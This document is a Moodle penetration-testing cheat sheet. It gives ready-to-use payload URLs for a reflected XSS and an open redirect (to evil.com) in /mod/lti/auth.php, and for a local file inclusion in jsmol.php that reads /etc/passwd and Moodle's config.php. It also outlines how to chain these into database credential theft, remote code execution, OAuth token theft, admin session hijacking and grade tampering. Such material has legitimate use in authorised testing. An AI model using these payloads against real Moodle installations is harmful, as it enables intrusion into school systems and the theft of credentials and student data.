## 1. Overview

Moodle is an open-source learning management system (LMS) widely used by educational institutions. Like any complex web application, it has had various security vulnerabilities discovered over the years.

**Detection Method:**

- Check page source for: `<meta name="keywords" content="moodle,`
- Look for `/moodle/` in URLs
- Check common Moodle paths like `/login/index.php`

---

## 2. Exploitation Methods

### 2.1 Reflected XSS in /mod/lti/auth.php

**Vulnerable Parameter:** `redirect_uri`

**Test Payload:**

```
https://target.com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
```

**Steps:**

1. Navigate to the LTI auth endpoint
2. Inject JavaScript protocol in redirect_uri parameter
3. Observe if script executes

---

### 2.2 Open Redirect in /mod/lti/auth.php

**Vulnerable Parameter:** `redirect_uri`

**Test Payload:**

```
https://target.com/mod/lti/auth.php?redirect_uri=https://evil.com
```

**Steps:**

1. Access the LTI authentication page
2. Supply external URL in redirect_uri
3. Check if application redirects without validation
4. Can be chained with phishing or OAuth token theft

---

### 2.3 Local File Inclusion (LFI) in jsmol.php

**Path:** `/filter/jmol/js/jsmol/php/jsmol.php`  
**Vulnerable Parameter:** `query`

**Test Payload:**

```
https://target.com/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
```

**Steps:**

1. Access the jsmol.php endpoint
2. Use `call=getRawDataFromDatabase` function
3. Supply `file://` protocol in query parameter
4. Read sensitive files from server

**Common Files to Test:**

- `file:///etc/passwd`
- `file:///etc/hosts`
- `file:///var/www/html/config.php`
- `file://C:/Windows/win.ini` (Windows)

---

## 3. Higher Impact Scenarios

### 3.1 LFI → Database Credentials

- Read Moodle config file (usually `/var/www/html/moodle/config.php`)
- Extract database credentials
- Connect to database directly
- Escalate to RCE or full data breach

### 3.2 Open Redirect → Account Takeover

- Chain with OAuth flows
- Steal authorization tokens
- Phishing campaigns with trusted domain

### 3.3 XSS → Session Hijacking

- Steal admin cookies
- Perform actions as privileged user
- Modify course content or grades

---

## 4. Additional Resources

**Mass Hunting Article:**

- [Mass Hunting XSS in Moodle](https://dewangpanchal98.medium.com/mass-hunting-xss-moodle-ed4b50c82516)

---

## 5. Testing Checklist

✅ Check for Moodle detection (meta tags, paths)  
✅ Test `/mod/lti/auth.php` for XSS and open redirect  
✅ Test `/filter/jmol/js/jsmol/php/jsmol.php` for LFI  
✅ Enumerate common Moodle paths and endpoints  
✅ Check for outdated Moodle version indicators  
✅ Test file upload functionality in courses/assignments  
✅ Look for exposed config files or backups

---

**Author Credits:**  
[@th3.d1p4k](https://twitter.com/DipakPanchal05)